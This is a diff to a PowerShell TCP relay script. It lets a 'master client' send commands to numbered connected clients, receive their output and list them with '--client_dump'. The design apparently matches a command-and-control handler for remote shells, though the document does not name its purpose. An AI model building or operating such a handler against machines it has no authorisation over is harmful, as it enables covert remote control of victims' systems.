@@ -74,16 +74,29 @@ while ($exit -eq 0) {
 					} else {
 						$client_stream = $ClientList[$i].ClientConn.GetStream();
 						$client_reader = New-Object System.IO.StreamReader($client_stream);
-						$master_stream = $MasterClient.ClientConn.GetStream();
-						$master_writer = New-Object System.IO.StreamWriter($master_stream);
-						while ($client_reader.Peek() -ge 0) {
-							try {
-								$in_buff = $client_reader.ReadLine();
-								$join = $in_buff -join "";
-								$master_writer.WriteLine($join);
-								$master_writer.Flush();								
-							} catch {}
+
+						if ($MasterClient -ne $null) {
+							$master_stream = $MasterClient.ClientConn.GetStream();
+							$master_writer = New-Object System.IO.StreamWriter($master_stream);
+							while ($client_reader.Peek() -ge 0) {
+								try {
+									$in_buff = $client_reader.ReadLine();
+									$join = $in_buff -join "";
+									$master_writer.WriteLine($join);
+									$master_writer.Flush();								
+								} catch {}
+							}
+
+						} else {
+							while ($client_reader.Peek() -ge 0) {
+								try {
+									$in_buff = $client_reader.ReadLine();
+									$join = $in_buff -join "";
+									Write-Output $join;						
+								} catch {}
+							}
 						}
+
 					}
 				}
 			} catch [ObjectDisposedException] {
@@ -119,7 +132,7 @@ while ($exit -eq 0) {
 							#Dump connected client info to master client.
 							
 							#client_dump####################################################
-							if ($join -match "client_dump") {
+							if ($join -match ".*--client_dump") {
 								Write-Output "Dumping client list to master client.";
 								if ($ClientList.Length -gt 0) {
 									for ($i=0; $i -lt $ClientList.Length; $i++) {
@@ -136,17 +149,24 @@ while ($exit -eq 0) {
 								}
 
 								$master_writer.Flush();
+							} elseif ($join -match ".*--[i|I][d|D]=([0-9]+)\s+--command=(.*)") {
+								
+								for ($i=0; $i -lt $ClientList.Length; $i++) {
+									if ($Matches[1] -eq $ClientList[$i].ID) {
+										$client_stream = $ClientList[$i].ClientConn.GetStream();
+										$client_writer = New-Object System.IO.StreamWriter($client_stream)
+										$client_writer.WriteLine($Matches[2]);
+										$client_writer.Flush();
+									}
+								}
+
+							} else {
+								$master_writer.WriteLine("improper format detected:\n");
+								$master_writer.WriteLine("Command: '--id=<int> --command=<string>'")
+								$master_writer.WriteLine("ClientList: '--client_dump'")
+								$master_writer.Flush();
 							}
 							#################################################################
-							
-							
-							
-							
-							
-							
-							
-							
-							
 						} catch{
 							Write-Output $_;
 						}
